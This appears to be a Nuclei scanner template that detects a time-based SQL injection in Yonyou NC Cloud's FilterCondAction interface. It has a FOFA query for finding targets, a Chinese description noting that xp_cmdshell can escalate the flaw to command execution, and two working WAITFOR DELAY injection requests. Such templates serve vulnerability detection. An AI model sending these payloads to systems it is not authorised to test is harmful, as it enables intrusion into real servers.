id: yongyouNC-Cloud-FilterCondAction-sql-time

info:
  name: 用友NC Cloud FilterCondAction SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="用友-U8-Cloud"
    用友NC Cloud FilterCondAction接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - https://mp.weixin.qq.com/s/bUklGSKN_l_UYP0Suk3L4g
  tags: sql injection

http:
  - raw:
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and